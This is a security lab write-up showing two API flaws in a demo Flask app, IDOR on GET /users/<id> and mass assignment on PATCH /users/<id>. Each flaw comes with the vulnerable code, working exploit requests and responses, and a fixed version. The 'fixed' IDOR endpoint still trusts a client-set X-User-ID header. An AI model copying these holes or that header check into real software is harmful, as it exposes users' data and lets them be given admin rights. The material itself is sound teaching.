# Vulnerability 1 — IDOR / BOLA

Claim Violated
	- A user can only access their own user object.

Vulnerable Endpoint
	- GET /users/<id>

Code:
```@app.route("/users/<int:user_id>", methods=["GET"])
def get_user(user_id):
    user = users.get(user_id)
    if not user:
        return jsonify({"error": "not found"}), 404
    # VULNERABILITY: no authentication, no ownership check
    return jsonify(user), 200
```
---

Exploit Summary

Victim legitimately calls:
```
GET /users/1
```
Attacker intercepts this request in Burp (Proxy).

Attacker modifies the path:
```
/users/1 → /users/3
```
Server returns the admin user:
```
	{
  "id": 3,
  "username": "brenn",
  "role": "admin",
  "email": "brenn@example.com"
}
```
No AuthN or AuthZ (Just ID in the URL)

This demonstartes authorization derived from client-controlled input (URL)

---

Fixed Comparison Endpoint

GET /users_secure/<id>

Code:
```
@app.route("/users_secure/<int:user_id>")
def get_user_secure(user_id):
    user = users.get(user_id)
    if not user:
        return jsonify({"error": "not found"}), 404

    # Expect header: X-User-ID: <int>
    requester_id = request.headers.get("X-User-ID")

    try:
        requester_id = int(requester_id)
    except (TypeError, ValueError):
        return jsonify({"error": "forbidden"}), 403

    if requester_id != user_id:
        return jsonify({"error": "forbidden"}), 403

    return jsonify(user), 200
```
Used here to illustrate the core principle:

Authorization must be derived from server-side identity (here approximated by X-User-ID), not from the client-controlled ID in the URL.

---

# Vulnerability 2 — Mass Assignment / Privilege Escalation

Claim Violated
	- Clients cannot modify privileged attributes

Vulnerable Endpoint
	- PATCH /users/<id>

Code:
```
@app.route("/users/<int:user_id>", methods=["PATCH"])
def update_user(user_id):
    user = users.get(user_id)
    if not user:
        return jsonify({"error": "not found"}), 404

    # VULNERABILITY: blindly apply all fields from JSON to the user object
    data = request.get_json() or {}
    user.update(data)

    return jsonify(user), 200
```
---

Exploit Summary 

 1)Normal user starts as:
 ```
	{
  "id": 1,
  "username": "atlas",
  "role": "user",
  "email": "atlas@example.com"
}
```
2)Attacker sends:
```
PATCH /users/1
Content-Type: application/json

{
  "role": "admin"
}
```
3)Server response:
```
	{
  "id": 1,
  "username": "atlas",
  "role": "admin",
  "email": "atlas@example.com"
}
```
4)Follow up GET /users/1 confirms role is now "admin" 

---

Fixed Comparison Endpoint

Safe endpoint
	PATCH /users_safe/<id>
	
Code:	
```
ALLOWED_UPDATE_FIELDS = {"email", "username"}

@app.route("/users_safe/<int:user_id>", methods=["PATCH"])
def update_user_safe(user_id):
    user = users.get(user_id)
    if not user:
        return jsonify({"error": "not found"}), 404

    data = request.get_json() or {}
    safe_data = {k: v for k, v in data.items() if k in ALLOWED_UPDATE_FIELDS}
    user.update(safe_data)

    return jsonify(user), 200
```
Example request:
```
PATCH /users_safe/1
Content-Type: application/json

{
  "email": "safe@example.com",
  "role": "admin"
}
```
Response:
```
{
  "id": 1,
  "username": "atlas",
  "role": "user",
  "email": "safe@example.com"
}
```
Email is updated (whitelisted) and role is ignored (protected) when supplied by the client. 
